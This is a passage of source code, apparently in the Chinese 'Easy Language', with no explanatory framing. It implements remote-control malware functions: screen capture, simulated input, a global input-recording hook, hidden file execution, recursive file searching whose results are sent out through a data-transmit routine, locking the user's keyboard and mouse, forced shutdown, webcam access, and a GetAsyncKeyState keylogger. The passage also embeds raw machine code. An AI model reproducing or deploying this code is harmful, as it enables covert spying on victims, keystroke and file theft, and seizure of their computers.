赋值 (偏移, 选择 (等于 (求余数 (相乘 (图像宽, 3), 4), 0), 0, 相减 (4, 求余数 (相乘 (图像宽, 3), 4))))
 ' 遍历各点的颜色
置入代码 ({ 51, 246, 190, 54, 4, 0, 0, 51, 219, 139, 93, 8, 139, 27, 51, 255, 139, 125, 244, 139, 69, 248, 51, 201, 65, 81, 80, 59, 200, 15, 143, 60, 0, 0, 0, 139, 69, 252, 51, 201, 65, 81, 80, 59, 200, 15, 143, 34, 0, 0, 0, 138, 68, 51, 8, 138, 84, 62, 8, 58, 208, 117, 17, 128, 250, 12, 117, 7, 198, 68, 62, 8, 13, 235, 5, 198, 68, 62, 8, 12, 70, 88, 89, 235, 211, 131, 196, 8, 3, 117, 240, 88, 89, 235, 185, 131, 196, 8 })
返回 (数据)

.子程序 截图, 字节集, , 
.参数 窗口句柄, 空白型, 可空, 
.参数 宽度, 空白型, 可空, 
.参数 高度, 空白型, 可空, 

.局部变量 位图信息, BITMAPINFO, , , 
.局部变量 位图文件头, BITMAPFILEHEADER, , , 
.局部变量 桌面场景句柄, 整数型, , , 
.局部变量 内存场景句柄, 整数型, , , 
.局部变量 位图句柄, 整数型, , , 
.局部变量 旧位图句柄, 整数型, , , 
.局部变量 图像, 字节集, , , 
.局部变量 文件头, 字节集, , , 
.局部变量 位图指针, 整数型, , , 
.局部变量 DEVMODE, 短整数型, , "61", 

EnumDisplaySettings (0, -1, DEVMODE [1]) ' DEVMODE [53] 位深度
.如果 (是否为空 (窗口句柄))
    赋值 (位图信息.bmiHeader.biWidth, DEVMODE [55]) ' 宽度
    赋值 (位图信息.bmiHeader.biHeight, DEVMODE [57]) ' 高度
    
.否则
    赋值 (位图信息.bmiHeader.biWidth, 宽度)
    赋值 (位图信息.bmiHeader.biHeight, 高度)
.如果结束

赋值 (位图信息.bmiHeader.biBitCount, 8) ' 位深度
赋值 (位图信息.bmiHeader.biSize, 40) ' 结果大小
赋值 (位图信息.bmiHeader.biPlanes, 1) ' 位图位面数
赋值 (位图信息.bmiHeader.biSizeImage, 相乘 (位图信息.bmiHeader.biWidth, 位图信息.bmiHeader.biHeight))
赋值 (图像, 取空白字节集 (相加 (位图信息.bmiHeader.biSizeImage, 1064)))
CopyMemory_BITMAPINFO (图像 [1], 位图信息, 位图信息.bmiHeader.biSize)
复制内存_字节集到字节集 (图像 [41], 颜色表8位 [1], 1024)
赋值 (位图文件头.bfType, 19778)
赋值 (位图文件头.bfOffBits, 1078)
赋值 (位图文件头.bfSize, 相加 (位图文件头.bfOffBits, 位图信息.bmiHeader.biSizeImage))
赋值 (文件头, 取空白字节集 (14))
CopyMemory_BITMAPFILEHEADER (文件头 [1], 位图文件头, 14)
赋值 (桌面场景句柄, GetDC (窗口句柄))
赋值 (内存场景句柄, CreateCompatibleDC (桌面场景句柄))
赋值 (位图句柄, CreateDIBSection (内存场景句柄, 图像, 0, 位图指针, 0, 0))
赋值 (旧位图句柄, SelectObject (内存场景句柄, 位图句柄))
BitBlt (内存场景句柄, 0, 0, 位图信息.bmiHeader.biWidth, 位图信息.bmiHeader.biHeight, 桌面场景句柄, 0, 0, 13369376)
复制内存_字节集 (图像 [1065], 位图指针, 位图信息.bmiHeader.biSizeImage)
SelectObject (内存场景句柄, 旧位图句柄)
DeleteObject (位图句柄)
DeleteDC (内存场景句柄)
ReleaseDC (0, 桌面场景句柄)
返回 (相加 (文件头, 图像))

.子程序 鼠标键SendInput, 空白型, 公开, SendInput模拟鼠标按键(无返回值)
.参数 键, 整数型, 可空, 可空:为左键  1 #左键_   2 #右键_   3 #中键_
.参数 控制, 整数型, 可空, 可空:为单击  1 #单击_   2 #双击_   3 #按下_  4 #放开_
.参数 坐标X, 文本型, 可空, 移动到的坐标
.参数 坐标Y, 文本型, 可空, 

.如果真 (等于 (是否为空 (坐标X), 假))
    鼠标移动SendInput (坐标X, 坐标Y)
    核心_延时 (50)
.如果真结束
.如果真 (或者 (等于 (键, 1), 等于 (键, 0)))
    .如果真 (等于 (控制, 3))
        控制鼠标 (2)
    .如果真结束
    .如果真 (等于 (控制, 4))
        控制鼠标 (4)
    .如果真结束
    .如果真 (或者 (等于 (控制, 1), 等于 (控制, 0)))
        控制鼠标 (2)
        控制鼠标 (4)
    .如果真结束
    .如果真 (等于 (控制, 2))
        控制鼠标 (2)
        控制鼠标 (4)
        核心_延时 (_判断鼠标双击间隔 ())
        控制鼠标 (2)
        控制鼠标 (4)
    .如果真结束
    
.如果真结束
.如果真 (等于 (键, 3))
    .如果真 (等于 (控制, 3))
        控制鼠标 (32)
    .如果真结束
    .如果真 (等于 (控制, 4))
        控制鼠标 (64)
    .如果真结束
    .如果真 (或者 (等于 (控制, 1), 等于 (控制, 0)))
        控制鼠标 (32)
        控制鼠标 (64)
    .如果真结束
    .如果真 (等于 (控制, 2))
        控制鼠标 (32)
        控制鼠标 (64)
        核心_延时 (_判断鼠标双击间隔 ())
        控制鼠标 (32)
        控制鼠标 (64)
    .如果真结束
    
.如果真结束
.如果真 (等于 (键, 2))
    .如果真 (等于 (控制, 3))
        控制鼠标 (8)
    .如果真结束
    .如果真 (等于 (控制, 4))
        控制鼠标 (16)
    .如果真结束
    .如果真 (或者 (等于 (控制, 1), 等于 (控制, 0)))
        控制鼠标 (8)
        控制鼠标 (16)
    .如果真结束
    .如果真 (等于 (控制, 2))
        控制鼠标 (8)
        控制鼠标 (16)
        核心_延时 (_判断鼠标双击间隔 ())
        控制鼠标 (8)
        控制鼠标 (16)
    .如果真结束
    
.如果真结束



.子程序 控制鼠标, 逻辑型, , 
.参数 动作, 整数型, , 
.参数 x, 整数型, 可空, 
.参数 y, 整数型, 可空, 

.局部变量 Input, 鼠标输入_, , , 

赋值 (Input.类型, 0)
赋值 (Input.坐标.x, x)
赋值 (Input.坐标.y, y)
赋值 (Input.鼠标数据, 0)
赋值 (Input.扩展信息, 0)
赋值 (Input.鼠标动作, 动作)
赋值 (Input.时间, 取启动时间 ())
返回 (大于 (_鼠标输入 (1, Input, 28), 0))


.子程序 鼠标移动SendInput, 空白型, 公开, SendInput模拟鼠标移动(无返回值)目标坐标与实际坐标有一像素点误差属正常现象!
.参数 水平坐标, 文本型, , 
.参数 垂直坐标, 文本型, , 

.局部变量 临时坐标, 坐标型, , , 
.局部变量 x, 空白型, , , 
.局部变量 y, 空白型, , , 
.局部变量 目标X, 空白型, , , 
.局部变量 目标Y, 空白型, , , 
.局部变量 i, 空白型, , , 

赋值 (目标X, 相加 (到整数 (水平坐标), 临时坐标.x))
赋值 (目标Y, 相加 (到整数 (垂直坐标), 临时坐标.y))
赋值 (x, 取鼠标水平位置 ())
赋值 (y, 取鼠标垂直位置 ())
.如果真 (小于 (目标X, x)) ' 向左
    .循环判断首 ()
        .如果真 (大于 (i, 10000))
            跳出循环 ()
        .如果真结束
        赋值 (i, 相加 (i, 1))
        控制鼠标 (1, -1, 0)
    .循环判断尾 (大于 (取鼠标水平位置 (), 目标X))
.如果真结束
.如果真 (大于 (目标X, x)) ' 向右
    赋值 (i, 0)
    .循环判断首 ()
        .如果真 (大于 (i, 10000))
            跳出循环 ()
        .如果真结束
        赋值 (i, 相加 (i, 1))
        控制鼠标 (1, 1, 0)
    .循环判断尾 (小于 (取鼠标水平位置 (), 目标X))
.如果真结束
.如果真 (小于 (目标Y, y)) ' 向上
    赋值 (i, 0)
    .循环判断首 ()
        .如果真 (大于 (i, 10000))
            跳出循环 ()
        .如果真结束
        赋值 (i, 相加 (i, 1))
        控制鼠标 (1, 0, -1)
    .循环判断尾 (大于 (取鼠标垂直位置 (), 目标Y))
.如果真结束
.如果真 (大于 (目标Y, y)) ' 向下
    赋值 (i, 0)
    .循环判断首 ()
        .如果真 (大于 (i, 10000))
            跳出循环 ()
        .如果真结束
        赋值 (i, 相加 (i, 1))
        控制鼠标 (1, 0, 1)
    .循环判断尾 (小于 (取鼠标垂直位置 (), 目标Y))
.如果真结束


.子程序 按键SendInput, 空白型, 公开, SendInput执行模拟按键(无返回值)
.参数 键代码, 整数型, , 
.参数 状态, 整数型, 可空, 可空:按键(按下+放开)   3 #按下_   4 #放开_   如果状态大于等于5则为按下与放开之间的延时,可解决某些屏蔽
.参数 功能键方式, 逻辑型, 可空, 默认为普通键, 真:功能键方式模拟,如ctrl键win键home键光标键等

.局部变量 Input, 键盘输入_, , , 

赋值 (Input.类型, 1)
赋值 (Input.虚拟键码, 键代码)
赋值 (Input.扫描码, _键码转换 (键代码, 0))
赋值 (Input.扩展信息, 0)
.如果真 (不等于 (状态, 4))
    赋值 (Input.键盘动作, 选择 (功能键方式, 1, 0))
    赋值 (Input.时间, 取启动时间 ())
    _键盘输入 (1, Input, 28)
.如果真结束
.如果真 (不等于 (状态, 3))
    赋值 (Input.键盘动作, 选择 (功能键方式, 3, 2))
    赋值 (Input.时间, 取启动时间 ())
    _键盘输入 (1, Input, 28)
.如果真结束
.如果真 (大于 (状态, 4))
    赋值 (Input.键盘动作, 选择 (功能键方式, 1, 0))
    赋值 (Input.时间, 取启动时间 ())
    _键盘输入 (1, Input, 28)
    延时 (状态)
    赋值 (Input.键盘动作, 选择 (功能键方式, 3, 2))
    赋值 (Input.时间, 取启动时间 ())
    _键盘输入 (1, Input, 28)
    延时 (状态)
.如果真结束





.子程序 安装记录钩子, 整数型, 公开, 安装一个记录鼠标键盘事件的钩子,返回钩子ID(该命令为高级命令)
 ' 记录钩子指针 ＝ &钩子事件子程序
返回 (安装钩子_ (0, &记录钩子处理, _取模块句柄 (0), 0))

.子程序 卸载记录钩子, 空白型, 公开, 卸载已安装的钩子集 (本命令会在类变量销毁时自动被调用)
卸载钩子_ (记录钩子句柄)

.子程序 记录钩子处理, 整数型, , HOOK类
.参数 icode, 整数型, , 
.参数 wparam, 整数型, , 
.参数 lparam, 整数型, , 

.局部变量 临时, MSG, , , 
.局部变量 返回值, 整数型, , , 
.局部变量 key, 字节集, , , 


.如果真 (等于 (icode, 0))
    CopyMemoryR (临时, lparam, 20)
    赋值 (返回值, _回调钩子 (&钩子事件子程序, 临时.hwnd, 临时.message, 临时.paramL, 临时.paramH))
    .如果真 (等于 (返回值, 1))
        返回 (1)
    .如果真结束
    .如果真 (不等于 (返回值, 0))
        赋值 (key, { 0, 30, 0, 0 })
         ' key [1] ＝ 到字节 (返回值)
        赋值 (临时.paramL, 取字节集数据 (key, 3, ))
        CopyMemoryP (lparam, 临时, 20)
    .如果真结束
    
.如果真结束
返回 (下一个钩子 (&钩子事件子程序, icode, wparam, lparam))

.子程序 钩子事件子程序, 整数型, , 接收记录鼠键事件的回调函数指针,回调指针(hwnd,message,paramL,paramH),返回0:放行,返回1:拦截,返回键代码:换键
.参数 hwnd, 空白型, , 对象的句柄
.参数 message, 空白型, , 消息
.参数 paramL, 空白型, , ParamL：如果是键盘消息则代表虚拟码，如果是鼠标消息则代表坐标X
.参数 paramH, 空白型, , ParamH：如果是键盘消息则代表击键的扫描码，如果是鼠标消息则代表坐标Y

 ' 输出调试文本 (hwnd)
 ' 输出调试文本 (message)
输出调试文本 (paramL)
输出调试文本 (paramH)
返回 (0)

.子程序 执行文件, 整数型, , 
.参数 文件路径, 文本型, , 
.参数 传递参数, 文本型, 可空, 
.参数 文件运行目录, 文本型, 可空, 
.参数 窗口方式, 整数型, , 0：隐藏窗口,1：普通激活,2：最小化激活,3：最大化激活,4：普通不激活,5：普通激活,6：最小化不激活,7：最小化不激活,8：不激活

.局部变量 x, 整数型, , , 
.局部变量 tmp, 文本型, , , 
.局部变量 add, 整数型, , , 

.如果真 (等于 (文件运行目录, “”))
    赋值 (add, 倒找文本 (文件路径, “\”, , 假))
    赋值 (文件运行目录, 取文本左边 (文件路径, add))
.如果真结束
赋值 (x, 执行文件DLL (0, “open”, 文件路径, 传递参数, 文件运行目录, 窗口方式))
返回 (x)

.子程序 文件搜索子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 文本型, , "0", 
.局部变量 处理, 文本型, , , 
.局部变量 X, 空白型, , , 
.局部变量 盘, 文本型, , "0", 
.局部变量 临时文本, 文本型, , , 


赋值 (命令, 分割文本 (到文本 (数据), “?|*|/”, ))
赋值 (停止搜索, 0) ' 允许搜索
.如果真 (等于 (命令 [1], “停止搜索”))
    赋值 (停止搜索, 1)
    输出调试文本 (“停止搜索”)
    返回 ()
.如果真结束
.如果真 (等于 (命令 [1], “所有硬盘”))
    赋值 (停止搜索, 0)
    赋值 (盘, 分割文本 (命令 [2], “|”, ))
    输出调试文本 (命令 [2])
    输出调试文本 (命令 [3])
    .计次循环首 (取数组成员数 (盘), X)
        文件搜索开始子程序 (盘 [X], 命令 [3])
    .计次循环尾 ()
    .计次循环首 (取数组成员数 (盘), X)
        赋值 (临时文本, 相加 (临时文本, 盘 [X], “ˉ”))
    .计次循环尾 ()
    
    传送数据子程序 (1, 相加 ({ 4 }, { 2 }, 到字节集 (相加 (命令 [1], 命令 [2], “★4?\+^”, “文件搜索完毕: 目录-(”, 命令 [1], “)   文件-(”, 临时文本, “)|”))))
    
    返回 ()
.如果真结束

文件搜索开始子程序 (命令 [1], 命令 [2])
赋值 (停止搜索, 0)

传送数据子程序 (1, 相加 ({ 4 }, { 2 }, 到字节集 (相加 (命令 [1], 命令 [2], “★4?\+^”, “文件搜索完毕: 目录-(”, 命令 [1], “)   文件-(”, 命令 [2], “)|”))))

返回 ()

.子程序 文件搜索开始子程序, 空白型, , 
.参数 搜索目录, 文本型, , 
.参数 搜索key, 文本型, , 

.局部变量 寻找到的文件名, 文本型, , "0", 
.局部变量 X, 空白型, , , 

处理事件 ()

.如果真 (不等于 (取文本右边 (搜索目录, 1), “\”))
    赋值 (搜索目录, 相加 (搜索目录, “\”))
.如果真结束

文件_寻找文件 (相加 (搜索目录, “*”), , 寻找到的文件名)
.计次循环首 (取数组成员数 (寻找到的文件名), X)
    .如果真 (不等于 (寻找文本 (寻找到的文件名 [X], 搜索key, , 假), -1))
        .如果 (等于 (停止搜索, 0))
            赋值 (搜索到的文件, 相加 (搜索到的文件, 搜索目录, 寻找到的文件名 [X], “|”))
            .如果真 (大于 (取文本长度 (搜索到的文件), 5000))
                传送数据子程序 (1, 相加 ({ 4 }, { 2 }, 到字节集 (相加 (搜索目录, 搜索key, “★4?\+^”, 搜索到的文件))))
                赋值 (搜索到的文件, “”)
            .如果真结束
            
        .否则
            跳出循环 ()
        .如果结束
        
    .如果真结束
    
.计次循环尾 ()
文件_寻找文件 (相加 (搜索目录, “*”), #子目录, 寻找到的文件名)
.计次循环首 (取数组成员数 (寻找到的文件名), X)
    .如果真 (不等于 (取文本左边 (寻找到的文件名 [X], 1), “.”))
        .如果 (等于 (停止搜索, 0))
            文件搜索开始子程序 (相加 (搜索目录, 寻找到的文件名 [X]), 搜索key)
        .否则
            跳出循环 ()
        .如果结束
        
    .如果真结束
    
.计次循环尾 ()
.如果真 (大于 (取文本长度 (搜索到的文件), 1))
    传送数据子程序 (1, 相加 ({ 4 }, { 2 }, 到字节集 (相加 (搜索目录, 搜索key, “★4?\+^”, 搜索到的文件))))
    赋值 (搜索到的文件, “”)
.如果真结束



.子程序 磁盘_枚举文件, 整数型, 公开, 返回文件数量
.参数 指定目录, 文本型, , 
.参数 返回文件, 文本型, 参考 可空 数组, 

.局部变量 文件名, 文本型, , , 
.局部变量 目录, 文本型, , , 
.局部变量 文件, 文本型, , "0", 
.局部变量 操作目录, 文本型, , , 

.如果 (等于 (倒找文本 (指定目录, “\”, 1, 假), -1))
    赋值 (操作目录, 相加 (指定目录, “\”))
.否则
    赋值 (操作目录, 指定目录)
.如果结束
赋值 (文件名, 寻找文件 (相加 (操作目录, “\*.*”), ))
.判断循环首 (不等于 (文件名, “”))
    .如果 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
        加入成员 (文件, 文件名)
         ' 输出调试文本 (文件名)
         ' 文件 ＝ 文件 ＋ 文件名 ＋ “|”
    .否则
        
    .如果结束
    赋值 (文件名, 寻找文件 ())
    
.判断循环尾 ()
赋值 (返回文件, 文件)
返回 (取数组成员数 (文件))

.子程序 磁盘_枚举目录, 整数型, 公开, 返回目录数量
.参数 指定目录, 文本型, , 
.参数 返回目录, 文本型, 参考 可空 数组, 

.局部变量 文件名, 文本型, , , 
.局部变量 索引, 整数型, , , 
.局部变量 完整路径, 空白型, , , 
.局部变量 NN, 空白型, , , 
.局部变量 操作目录, 文本型, , , 
.局部变量 目录, 文本型, , "0", 

.如果 (等于 (倒找文本 (指定目录, “\”, 1, 假), -1))
    赋值 (操作目录, 相加 (指定目录, “\”))
.否则
    赋值 (操作目录, 指定目录)
.如果结束

赋值 (文件名, 寻找文件 (相加 (操作目录, “*”), #子目录))
.判断循环首 (不等于 (文件名, “”))
    .如果真 (并且 (不等于 (取文本左边 (文件名, 1), “.”), 不等于 (到小写 (文件名), “recycled”)))
         ' 输出调试文本 (文件名)
        加入成员 (目录, 文件名)
    .如果真结束
    赋值 (文件名, 寻找文件 (#子目录))
    
.判断循环尾 ()
赋值 (返回目录, 目录)
 ' .计次循环首 (取数组成员数 (目录), NN)
     ' 文件名 ＝ 目录 [NN]
     ' 输出调试文本 (文件名)
 ' .计次循环尾 ()
返回 (取数组成员数 (目录))

.子程序 磁盘_取剩余空间, 长整数型, 公开, 失败返回-1。如果磁盘剩余空间数目大于长整数范围则得到的结果是错误的。
.参数 磁盘驱动器字符, 文本型, , 
.参数 单位, 逻辑型, 可空, 真为以字节为单位，假为以KB为单位，留空默认为假。

.局部变量 数值, 长整数型, , , 
.局部变量 总大小, 长整数型, , , 
.局部变量 剩余空间, 长整数型, , , 

返回 (选择 (等于 (GetDiskFreeSpaceExA (相加 (取文本左边 (磁盘驱动器字符, 1), “:\”), 数值, 总大小, 剩余空间), 0), -1, 选择 (单位, 剩余空间, 相除 (剩余空间, 1024))))

.子程序 磁盘_取总空间, 长整数型, 公开, 失败返回-1。如果磁盘总空间数目大于长整数范围则得到的结果是错误的。
.参数 磁盘驱动器字符, 文本型, , 
.参数 单位, 逻辑型, 可空, 真为以字节为单位，假为以KB为单位，留空默认为假。

.局部变量 数值, 长整数型, , , 
.局部变量 总大小, 长整数型, , , 
.局部变量 剩余空间, 长整数型, , , 

返回 (选择 (等于 (GetDiskFreeSpaceExA (相加 (取文本左边 (磁盘驱动器字符, 1), “:\”), 数值, 总大小, 剩余空间), 0), -1, 选择 (单位, 总大小, 相除 (总大小, 1024))))

.子程序 磁盘_取已用空间, 长整数型, 公开, 失败返回-1。如果磁盘已用空间数目大于长整数范围则得到的结果是错误的。
.参数 磁盘驱动器字符, 文本型, , 
.参数 单位, 逻辑型, 可空, 真为以字节为单位，假为以KB为单位，留空默认为假。

.局部变量 总大小, 长整数型, , , 
.局部变量 剩余空间, 长整数型, , , 

赋值 (总大小, 磁盘_取总空间 (磁盘驱动器字符, 单位))
赋值 (剩余空间, 磁盘_取剩余空间 (磁盘驱动器字符, 单位))
返回 (选择 (或者 (等于 (总大小, -1), 等于 (剩余空间, -1)), -1, 相减 (总大小, 剩余空间)))

.子程序 磁盘_取驱动器列表, 整数型, 公开, 成功返回驱动器数目，失败返回0。
.参数 列表数组, 文本型, 参考 可空 数组, 驱动器列表以参考数组形式传回，请提供一个变量接收。留空则只返回驱动器数目。数组一个成员含一个驱动器盘符。

.局部变量 字节集, 字节集, , , 
.局部变量 长度, 整数型, , , 
.局部变量 临时, 字节集, , , 
.局部变量 计次, 整数型, , , 

清除数组 (列表数组)
赋值 (长度, GetLogicalDriveStringsA (0, 字节集))
.如果真 (等于 (长度, 0))
    返回 (0)
.如果真结束
赋值 (字节集, 取空白字节集 (长度))
.如果真 (等于 (GetLogicalDriveStringsA (长度, 字节集), 0))
    返回 (0)
.如果真结束
.变量循环首 (1, 相减 (长度, 2), 4, 计次)
    加入成员 (列表数组, 到文本 (取字节集中间 (字节集, 计次, 3)))
.变量循环尾 ()
返回 (取数组成员数 (列表数组))

.子程序 磁盘_置卷标, 逻辑型, 公开, 
.参数 磁盘驱动器字符, 文本型, , 
.参数 欲置入的卷标文本, 文本型, 可空, 留空默认为删除当前卷标。

返回 (SetVolumeLabelA (相加 (取文本左边 (磁盘驱动器字符, 1), “:\”), 欲置入的卷标文本))

.子程序 磁盘_取卷标, 文本型, 公开, 指定磁盘不存在卷标或发生错误返回空文本。
.参数 磁盘驱动器字符, 文本型, , 

.局部变量 卷标, 文本型, , , 
.局部变量 数组, 整数型, , "3", 
.局部变量 NULL, 文本型, , , 

赋值 (卷标, 取空白文本 (256))
返回 (选择 (不等于 (GetVolumeInformationA (相加 (取文本左边 (磁盘驱动器字符, 1), “:\”), 卷标, 256, 数组 [1], 数组 [2], 数组 [3], NULL, 0), 0), 卷标, “”))

.子程序 磁盘_取信息, 磁盘信息_, 公开, 出错返回空信息。
.参数 欲取其信息的驱动器盘符, 文本型, , 

.局部变量 数值, 整数型, , "3", 
.局部变量 文本, 文本型, , "2", 
.局部变量 信息, 磁盘信息_, , , 
.局部变量 NULL, 磁盘信息_, , , 

赋值 (信息.盘符, 相加 (取文本左边 (欲取其信息的驱动器盘符, 1), “:\”))
赋值 (信息.驱动器类型, GetDriveTypeA (信息.盘符))
.如果真 (或者 (等于 (信息.驱动器类型, 0), 等于 (信息.驱动器类型, 1)))
    返回 (NULL)
.如果真结束
赋值 (信息.磁盘总空间, 磁盘_取总空间 (信息.盘符, 真))
赋值 (信息.磁盘剩余空间, 磁盘_取剩余空间 (信息.盘符, 真))
赋值 (信息.磁盘已用空间, 相减 (信息.磁盘总空间, 信息.磁盘剩余空间))
.如果真 (或者 (等于 (信息.磁盘总空间, -1), 等于 (信息.磁盘剩余空间, -1)))
    .如果真 (等于 (信息.驱动器类型, #驱动器类型_光盘驱动器))
        连续赋值 (0, 信息.磁盘总空间, 信息.磁盘剩余空间, 信息.磁盘已用空间)
        返回 (信息)
    .如果真结束
    返回 (NULL)
.如果真结束
连续赋值 (取空白文本 (256), 文本 [1], 文本 [2])
.如果真 (等于 (GetVolumeInformationA (信息.盘符, 文本 [1], 256, 数值 [1], 数值 [2], 数值 [3], 文本 [2], 256), 0))
    返回 (NULL)
.如果真结束
赋值 (信息.卷标, 文本 [1])
赋值 (信息.序列号, 数值 [1])
赋值 (信息.文件系统名称, 文本 [2])
返回 (信息)

.子程序 键盘和鼠标锁定, 整数型, 公开, BlockInput
.参数 是否锁定, 整数型, , fBlock 1.锁定，0.解除

.局部变量 返回, 整数型, , , 



.如果 (或者 (等于 (是否锁定, 1), 等于 (是否锁定, 0)))
    
    
.否则
    
    
    赋值 (是否锁定, 1)
.如果结束


赋值 (返回, BlockInput (是否锁定))


返回 (返回)

.子程序 关机操作, 空白型, , 0:关机 1:重启 2:快速关机
.参数 整数, 整数型, , 

.如果真 (并且 (大于 (整数, -1), 小于 (整数, 3)))
    RtlAdjustPrivilege (19, 1, 0, 0)
    NtShutdownSystem (整数)
.如果真结束


.子程序 capDriverConnect, 逻辑型, , 
.参数 lwnd, 空白型, , 
.参数 地址, 空白型, , 

返回 (SendMessageA_luoji (lwnd, 1034, 0, 0))


.子程序 键盘记录, 文本型, , 
.参数 大小写状态, 逻辑型, , 

.局部变量 回车, 整数型, , , 
.局部变量 空格, 整数型, , , 
.局部变量 Q, 整数型, , , 
.局部变量 W, 整数型, , , 
.局部变量 E, 整数型, , , 
.局部变量 R, 整数型, , , 
.局部变量 T, 整数型, , , 
.局部变量 Y, 整数型, , , 
.局部变量 U, 整数型, , , 
.局部变量 I, 整数型, , , 
.局部变量 O, 整数型, , , 
.局部变量 P, 整数型, , , 
.局部变量 A, 整数型, , , 
.局部变量 S, 整数型, , , 
.局部变量 D, 整数型, , , 
.局部变量 F, 整数型, , , 
.局部变量 G, 整数型, , , 
.局部变量 H, 整数型, , , 
.局部变量 J, 整数型, , , 
.局部变量 K, 整数型, , , 
.局部变量 L, 整数型, , , 
.局部变量 Z, 整数型, , , 
.局部变量 C, 整数型, , , 
.局部变量 V, 整数型, , , 
.局部变量 x, 整数型, , , 
.局部变量 B, 整数型, , , 
.局部变量 N, 整数型, , , 
.局部变量 M, 空白型, , , 
.局部变量 S1, 空白型, , , 
.局部变量 S2, 空白型, , , 
.局部变量 S3, 空白型, , , 
.局部变量 S4, 空白型, , , 
.局部变量 S5, 空白型, , , 
.局部变量 S6, 空白型, , , 
.局部变量 S7, 空白型, , , 
.局部变量 S8, 空白型, , , 
.局部变量 S9, 空白型, , , 
.局部变量 S0, 空白型, , , 
.局部变量 加, 空白型, , , 
.局部变量 减, 空白型, , , 
.局部变量 除, 空白型, , , 
.局部变量 飞, 空白型, , , 
.局部变量 BACK, 空白型, , , 
.局部变量 TAB, 空白型, , , 
.局部变量 Ctrl, 空白型, , , 
.局部变量 Alt, 空白型, , , 
.局部变量 大写, 空白型, , , 
.局部变量 Shift, 空白型, , , 
.局部变量 Win, 空白型, , , 
.局部变量 n1, 空白型, , , 
.局部变量 n2, 空白型, , , 
.局部变量 n3, 空白型, , , 
.局部变量 n4, 空白型, , , 
.局部变量 n5, 空白型, , , 
.局部变量 n6, 空白型, , , 
.局部变量 n7, 空白型, , , 
.局部变量 n8, 空白型, , , 
.局部变量 n9, 空白型, , , 
.局部变量 n0, 空白型, , , 
.局部变量 n点, 空白型, , , 
.局部变量 n回车, 空白型, , , 
.局部变量 n加, 空白型, , , 
.局部变量 n减, 空白型, , , 
.局部变量 n除, 空白型, , , 
.局部变量 n乘, 空白型, , , 
.局部变量 F1, 空白型, , , 
.局部变量 F2, 空白型, , , 
.局部变量 F3, 空白型, , , 
.局部变量 F4, 空白型, , , 
.局部变量 F5, 空白型, , , 
.局部变量 F6, 空白型, , , 
.局部变量 F7, 空白型, , , 
.局部变量 F8, 空白型, , , 
.局部变量 F9, 空白型, , , 
.局部变量 F10, 空白型, , , 
.局部变量 F11, 空白型, , , 
.局部变量 F12, 空白型, , , 
.局部变量 Insert, 空白型, , , 
.局部变量 Home, 空白型, , , 
.局部变量 PageUp, 空白型, , , 
.局部变量 Delete, 空白型, , , 
.局部变量 End, 空白型, , , 
.局部变量 PageDown, 空白型, , , 
.局部变量 逗号, 空白型, , , 
.局部变量 句号, 空白型, , , 
.局部变量 斜杠, 空白型, , , 
.局部变量 NumLock, 空白型, , , 
.局部变量 ScrollLock, 空白型, , , 
.局部变量 PrintScreen, 空白型, , , 
.局部变量 Pause, 空白型, , , 
.局部变量 Esc, 空白型, , , 
.局部变量 上方向, 空白型, , , 
.局部变量 下方向, 空白型, , , 
.局部变量 左方向, 空白型, , , 
.局部变量 右方向, 空白型, , , 
.局部变量 右Win, 空白型, , , 
.局部变量 L方括号, 空白型, , , 
.局部变量 R方括号, 空白型, , , 
.局部变量 引号, 空白型, , , 
.局部变量 分号, 空白型, , , 

赋值 (L方括号, GetAsyncKeyState (219))
赋值 (R方括号, GetAsyncKeyState (221))
赋值 (分号, GetAsyncKeyState (186))
赋值 (引号, GetAsyncKeyState (222))
赋值 (右Win, GetAsyncKeyState (92))
赋值 (上方向, GetAsyncKeyState (38))
赋值 (下方向, GetAsyncKeyState (40))
赋值 (左方向, GetAsyncKeyState (37))
赋值 (右方向, GetAsyncKeyState (39))
赋值 (逗号, GetAsyncKeyState (188))
赋值 (NumLock, GetAsyncKeyState (144))
赋值 (ScrollLock, GetAsyncKeyState (145))
赋值 (PrintScreen, GetAsyncKeyState (44))
赋值 (Pause, GetAsyncKeyState (19))
赋值 (Esc, GetAsyncKeyState (27))
赋值 (句号, GetAsyncKeyState (190))
赋值 (n0, GetAsyncKeyState (96))
赋值 (n1, GetAsyncKeyState (97))
赋值 (n2, GetAsyncKeyState (98))
赋值 (n3, GetAsyncKeyState (99))
赋值 (n4, GetAsyncKeyState (100))
赋值 (n5, GetAsyncKeyState (101))
赋值 (n6, GetAsyncKeyState (102))
赋值 (n7, GetAsyncKeyState (103))
赋值 (n8, GetAsyncKeyState (104))
赋值 (n9, GetAsyncKeyState (105))
赋值 (n乘, GetAsyncKeyState (106))
赋值 (n加, GetAsyncKeyState (107))
赋值 (n回车, GetAsyncKeyState (108))
赋值 (n减, GetAsyncKeyState (109))
赋值 (n点, GetAsyncKeyState (110))
赋值 (n除, GetAsyncKeyState (111))
赋值 (Ctrl, GetAsyncKeyState (#Ctrl键))
赋值 (Alt, GetAsyncKeyState (#Alt键))
赋值 (TAB, GetAsyncKeyState (#Tab键))
赋值 (Win, GetAsyncKeyState (91))
赋值 (Shift, GetAsyncKeyState (#Shift键))
赋值 (回车, GetAsyncKeyState (#回车键))
赋值 (空格, GetAsyncKeyState (#空格键))
赋值 (A, GetAsyncKeyState (#A键))
赋值 (B, GetAsyncKeyState (#B键))
赋值 (C, GetAsyncKeyState (#C键))
赋值 (D, GetAsyncKeyState (#D键))
赋值 (E, GetAsyncKeyState (#E键))
赋值 (F, GetAsyncKeyState (#F键))
赋值 (G, GetAsyncKeyState (#G键))
赋值 (H, GetAsyncKeyState (#H键))
赋值 (I, GetAsyncKeyState (#I键))
赋值 (J, GetAsyncKeyState (#J键))
赋值 (K, GetAsyncKeyState (#K键))
赋值 (L, GetAsyncKeyState (#L键))
赋值 (M, GetAsyncKeyState (#M键))
赋值 (N, GetAsyncKeyState (#N键))
赋值 (O, GetAsyncKeyState (#O键))
赋值 (P, GetAsyncKeyState (#P键))
赋值 (Q, GetAsyncKeyState (#Q键))
赋值 (R, GetAsyncKeyState (#R键))
赋值 (S, GetAsyncKeyState (#S键))
赋值 (T, GetAsyncKeyState (#T键))
赋值 (U, GetAsyncKeyState (#U键))
赋值 (V, GetAsyncKeyState (#V键))
赋值 (W, GetAsyncKeyState (#W键))
赋值 (x, GetAsyncKeyState (#X键))
赋值 (Y, GetAsyncKeyState (#Y键))
赋值 (Z, GetAsyncKeyState (#Z键))
